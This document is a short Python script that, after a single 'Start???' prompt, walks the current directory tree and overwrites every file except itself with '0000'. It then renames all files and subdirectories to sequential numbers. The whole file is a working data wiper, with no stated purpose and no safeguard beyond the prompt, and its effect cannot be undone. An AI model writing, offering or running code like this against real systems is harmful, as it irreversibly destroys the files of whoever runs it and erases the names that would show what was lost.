import os
import sys

input(">>> Start??? ")

for root, dirs, files in os.walk(".", topdown=False):

    number = 0
    for name in files:
        if name == os.path.basename(sys.argv[0]):
            continue
        
        with open(os.path.join(root, name), "w") as f:
            f.write("0000")
        os.rename(os.path.join(root, name), os.path.join(root, "{:08d}".format(number)))
        number += 1

    number = 0
    for name in dirs:
        os.rename(os.path.join(root, name), os.path.join(root, "{:08d}".format(number)))
        number += 1

print("DONE!")
